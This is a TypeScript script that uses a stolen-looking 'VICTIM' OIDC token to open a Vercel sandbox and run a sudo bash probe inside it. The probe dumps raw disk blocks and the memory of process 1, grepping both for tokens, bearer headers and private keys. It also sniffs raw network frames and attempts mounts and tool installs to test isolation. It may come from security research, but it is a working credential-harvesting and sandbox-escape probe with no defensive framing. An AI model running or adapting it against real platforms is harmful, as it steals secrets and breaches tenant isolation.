import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());

const SCRIPT = String.raw`
set +e
echo "===== block devices ====="
sudo lsblk 2>&1
ls -la /dev/vd* /dev/sd* 2>&1
cat /proc/partitions
echo
echo "===== try mount /dev/vda (ro) ====="
sudo mkdir -p /mnt/vda
sudo mount --make-rprivate / 2>&1
sudo mount -t xfs -o ro /dev/vda /mnt/vda 2>&1
sudo mount -o ro /dev/vda /mnt/vda 2>&1
ls -la /mnt/vda/ 2>&1 | head
echo "--- try mount --rbind of the existing mount via /proc/mounts ---"
grep vda /proc/mounts
echo
echo "===== snapshot: can we read all of /dev/vda? ====="
sudo dd if=/dev/vda bs=4M count=4 2>/dev/null | strings | grep -aiE "vercel|token|secret|apikey|bearer|api[_-]key|auth" | head -20
echo
echo "===== AF_PACKET sniff test (5s, cap_net_raw) ====="
sudo python3 - <<'PY'
import socket, struct, time
try:
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
    s.settimeout(5)
    start = time.time(); n = 0
    while time.time() - start < 5:
        try:
            d, addr = s.recvfrom(65535)
            n += 1
            if n <= 3:
                print("iface", addr[0], "proto", hex(addr[1]), "len", len(d), d[:64].hex())
        except socket.timeout:
            break
    print("total frames:", n)
except Exception as e:
    print("AF_PACKET error:", e)
PY
echo
echo "===== ifaces ====="
ip addr 2>&1
echo
echo "===== try install tcpdump/strace via apt (offline?) ====="
which apt-get dnf apk 2>&1
sudo apt-get install -y --no-install-recommends tcpdump strace 2>&1 | tail -3
echo
echo "===== pid 1 memory dump with ptrace (targeted) ====="
sudo ls -la /proc/1/mem /proc/1/maps 2>&1
sudo sh -c 'cat /proc/1/maps' 2>&1 | head -5
echo "--- attempt read of /proc/1/mem segments for interesting strings ---"
sudo sh -c 'grep -aE "X-Signature|spawn.v1|/run/cell|vercel.com|Bearer|authorization|-----BEGIN" /proc/1/mem 2>/dev/null | head' 
echo "try /proc/1/syscall and stack:"
sudo cat /proc/1/syscall 2>&1 | head -2
sudo ls -la /proc/1/task/ 2>&1 | head
echo DONE
`;

async function main() {
  const sbx = await Sandbox.get({ name: "victim-np", token: VICTIM, teamId: V.owner_id, projectId: V.project_id });
  const res = await sbx.runCommand("bash", ["-c", SCRIPT], { sudo: true, wait: true, timeout: 180_000 });
  console.log("exit:", res.exitCode);
  console.log(await res.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });